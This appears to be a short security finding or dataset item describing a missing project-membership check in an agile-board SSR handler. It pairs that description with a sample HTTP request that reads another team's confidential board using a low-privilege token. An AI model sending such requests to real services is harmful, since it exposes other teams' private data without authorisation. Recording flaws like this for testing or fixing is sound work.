diagnosis: The team agile board SSR handler dispatches sprint tasks directly into a shared Redux store using the requested projectId without checking whether the user is a member of the project team. Any authenticated user can view confidential sprint backlog items, architecture tasks, and internal project bug trackers of other teams.
exploit_request:
GET /ssr/projects/prj_stealth_ai_defense/agile-board HTTP/1.1
Host: agile.internal-tools.io
Authorization: Bearer dev_user_intern
